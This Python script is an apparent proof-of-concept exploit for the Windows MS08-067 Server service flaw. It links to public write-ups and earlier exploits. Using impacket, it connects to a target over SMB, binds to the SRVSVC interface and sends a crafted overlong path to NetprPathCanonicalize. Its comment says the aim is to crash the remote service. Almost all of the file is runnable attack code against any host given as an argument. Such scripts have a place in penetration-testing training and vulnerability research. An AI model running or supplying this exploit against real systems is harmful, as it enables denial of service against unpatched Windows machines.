#!/usr/bin/python
import sys
import socket
from impacket.smbconnection import SessionError
from impacket.dcerpc.v5 import transport
from impacket import uuid
from random import randint
from struct import pack

# Links & Resources
# https://www.coresecurity.com/system/files/RicharteSolino_2006-impacketv0.9.6.0.pdf
# http://www.phreedom.org/blog/2008/decompiling-ms08-067/
# https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
# https://github.com/tntC4stl3/POC/blob/master/ms08_067.py

## Vulnerable function's signature
# 	NET_API_STATUS NetprPathCanonicalize(
#     [in, string, unique] SRVSVC_HANDLE ServerName,
#     [in, string] WCHAR* PathName,
#     [out, size_is(OutbufLen)] unsigned char* Outbuf,
#     [in, range(0,64000)] DWORD OutbufLen,
#     [in, string] WCHAR* Prefix,
#     [in, out] DWORD* PathType,
#     [in] DWORD Flags
# )

# Test connection to SMB TCP/445
def try_connect(HOST, PORT):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    if s.connect_ex((HOST, PORT)) == 0:
        return 1
    else:
        return 0

# Reversed address
def ndr_long(value):
    return pack("<L", value)

# Since we're targeting MSWindows
def to_unicode(value):
    return value.encode("utf-16le")

def ndr_aling(value):
    return "\x00" * ((4 - (len(value) & 3)) & 3)

def ndr_uwstring(value):
    value = value + "\x00"
    rvalue = ndr_long(randint(1, 0xffffffff))
    length = ndr_long(len(value))
    utf16_value = value.encode("utf-16le")
    aligned_utf16_value = ndr_aling(utf16_value)
    return rvalue + length + ndr_long(0) + length + utf16_value + aligned_utf16_value

def ndr_wstring(value):
    value = value + "\x00"
    length = ndr_long(len(value))
    utf16_value = value.encode("utf-16le")
    aligned_utf16_value = ndr_aling(utf16_value)
    return length + ndr_long(0) + length + utf16_value + aligned_utf16_value

def ndr_wstring_prebuilt(value):
    if len(value) % 2 > 0:
        value = value + "\x00"
    length = len(value) / 2
    return ndr_long(length) + ndr_long(0) + ndr_long(length) + value + ndr_aling(value)

def generate_poc_payload():
    server = "A" * 6
    prefix = "\\"
    outbuf = 2
    path_type = 1
    flags = 0

    # path setup
    path = to_unicode("\\") + "A" * 508 + to_unicode("\\..\\..\\") + to_unicode("AAAAAAA") + "B" * (78) + "\x00" * 2

    payload = ndr_uwstring(server)
    payload += ndr_wstring_prebuilt(path)
    payload += ndr_long(outbuf)
    payload += ndr_wstring(prefix)
    payload += ndr_long(path_type)
    payload += ndr_long(flags)
    return payload

def DCE_connect(dce):
    try:
        dce.connect()
        return 1
    except SessionError:
        print "[!] Can't connect to remote host, maybe service has crashed?\n[!] Exiting..."
        sys.exit(1)

def pwn(HOST):
    # https://docs.microsoft.com/en-us/windows/desktop/midl/ncacn-np
    # ncacn_np keyword identified named pipes as the protocol familiy for the endpoint
    stringbinding = "ncacn_np:%s[\\pipe\\browser]" % (HOST)
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    dce = rpctransport.get_dce_rpc()

    if DCE_connect(dce) == 1:
        print "[+] Connected to \\\\pipe\\\\browser"
        # 4b324fc8-1670-01d3-1278-5a47bf6ee188: UUID to join Server Service (SRVSVC)
        binuid = uuid.uuidtup_to_bin(("4b324fc8-1670-01d3-1278-5a47bf6ee188", "3.0"))
        dce.bind(binuid)
        # Generate payload
        payload = generate_poc_payload() # crash remote service
        print payload
        # Send payload to remote host
        dce.call(0x1f, payload)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "Usage: %s <HOST>" % (sys.argv[0])
        sys.exit(1)
    else:
        conn = try_connect(sys.argv[1], 445)
        if not conn:
            print "\n[!] Can't access SMB port TCP/445 on remote host (%s)\n[!] Exiting..." % (sys.argv[1])
            sys.exit(1)
        else:
            print "\n[+] Successfully join'd \"%s\" on SMB port TCP/445" % (sys.argv[1])
            pwn(sys.argv[1])

        print "[*] Exiting normally..."
